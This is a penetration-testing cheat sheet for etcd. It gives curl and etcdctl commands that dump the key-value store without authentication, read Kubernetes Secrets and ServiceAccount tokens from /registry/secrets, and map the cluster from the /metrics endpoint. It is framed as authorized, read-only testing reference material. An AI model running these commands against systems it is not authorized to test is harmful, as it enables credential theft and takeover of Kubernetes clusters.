---
service: etcd
title: etcd
ports: 2379, 2380
aliases: etcd-client, etcd-server
---

# etcd — quick wins

**When you see it:** 2379/tcp open and `/v2/keys/?recursive=true` returns data without a
client cert → unauthenticated read of the entire key-value store. On a Kubernetes control
plane that is *game over*: etcd holds every Secret, ServiceAccount token, and kubelet cert.

> Authorized testing only. Triage is read-only (GET only). Anything that writes keys is out
> of scope for enumeration — do not `PUT`/`DELETE` against a live control plane.

## Triage (read-only)
```sh
curl -sk https://H:2379/version                         # etcd + cluster version
curl -sk "https://H:2379/v2/keys/?recursive=true" | head # legacy v2 unauth read
curl -sk https://H:2379/metrics | head                  # Prometheus metrics (leaks peers)
etcdctl --endpoints=https://H:2379 --insecure-skip-tls-verify endpoint status
```

## Quick wins

### v2 API — full key dump
```sh
curl -sk "https://H:2379/v2/keys/?recursive=true" | python3 -m json.tool
```
*Why:* the legacy v2 API needs no auth when client-cert enforcement is off; `?recursive=true`
walks the whole tree — on k8s the `/registry/secrets/...` path holds base64 Secrets.

### v3 API — read Kubernetes secrets
```sh
etcdctl --endpoints=https://H:2379 --insecure-skip-tls-verify \
  get / --prefix --keys-only | head
etcdctl --endpoints=https://H:2379 --insecure-skip-tls-verify \
  get /registry/secrets --prefix
```
*Why:* v3 stores values under `/registry/...`; ServiceAccount tokens read here let you
authenticate to the apiserver as any account, including `default` in `kube-system`.

### Metrics → cluster topology
```sh
curl -sk https://H:2379/metrics | grep -E "etcd_server_id|etcd_cluster_version|peer"
```
*Why:* the unauthenticated `/metrics` endpoint leaks member IDs, peer URLs (2380), and
version even when the KV store itself is locked down — maps the rest of the cluster.

## aranum helpers
- `aranumtoolkit/network/enum-etcd.sh` — dispatcher (`/version`, unauth `/v2/keys?recursive`, `/metrics`; flags CRITICAL on data return).

## Gotchas
- Properly hardened etcd requires mutual TLS (`--client-cert-auth`) → curl returns 401/`Unauthorized`; a leaked apiserver client cert re-opens it.
- Modern k8s (etcd 3.4+) disables the v2 API by default — use `etcdctl` v3 (`ETCDCTL_API=3`) if `/v2/keys` 404s.
- 2380 is the peer port (cluster-internal), not for client reads — target 2379.
- k8s Secrets are base64, not encrypted, unless `EncryptionConfiguration` is set — decode and check.

## Sources
- HackTricks `2379-pentesting-etcd`; etcd API v2/v3 docs; Kubernetes etcd hardening guidance.
